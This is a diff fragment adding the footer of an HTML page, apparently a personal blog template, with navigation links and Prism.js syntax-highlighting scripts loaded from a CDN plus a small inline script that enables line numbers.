+
+
+            </div>
+        </div>
+    </div>
+</section>
+
+
+    <footer id="footer">
+        <div class="footer-left">
+            Copyright &copy;
+            2023-2026
+            Litsasuk
+        </div>
+        <div class="footer-right">
+            <nav>
+                <ul>
+                    <li><a href="/">Home</a></li>
+                    <li><a href="/articles/">Articles</a></li>
+                    <li><a href="/categories/">Categories</a></li>
+                    <li><a href="/about/">About</a></li>
+                </ul>
+            </nav>
+        </div>
+    </footer>
+</div>
+
+  <!-- Prism 核心：禁用自动高亮 -->
+    <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/prism.min.js" data-manual></script>
+    <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/plugins/autoloader/prism-autoloader.min.js"></script>
+  
+  <!-- 所有插件 -->
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/plugins/line-numbers/prism-line-numbers.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/plugins/toolbar/prism-toolbar.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/plugins/copy-to-clipboard/prism-copy-to-clipboard.min.js"></script>
+
+  <!-- 最后：添加行号类 + 手动触发高亮 -->
+  <script>
+    document.querySelectorAll('pre:not(.line-numbers)').forEach(function(pre) {
+      pre.classList.add('line-numbers');
+    });
+    Prism.highlightAll();
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+
+</body>
+</html>
